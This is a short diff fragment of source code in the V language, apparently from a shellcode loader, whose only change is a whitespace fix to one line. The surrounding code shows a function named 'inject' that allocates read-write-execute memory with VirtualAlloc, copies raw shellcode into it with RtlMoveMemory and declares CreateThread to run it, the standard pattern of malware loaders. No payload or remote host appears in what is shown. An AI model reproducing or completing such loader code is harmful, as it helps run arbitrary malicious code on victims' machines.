@@ -171,7 +171,7 @@ fn C.CreateThread(voidptr, size_t, voidptr, voidptr, u32, &u32) voidptr
 fn inject(shellcode []byte) bool {
     println('Creating virtualAlloc')
     address_pointer := C.VirtualAlloc(voidptr(0), size_t(sizeof(shellcode)), 0x3000, 0x40)
-	println(address_pointer)
+    println(address_pointer)
 
     println('WriteProcessMemory')
     C.RtlMoveMemory(address_pointer, shellcode.data, shellcode.len)
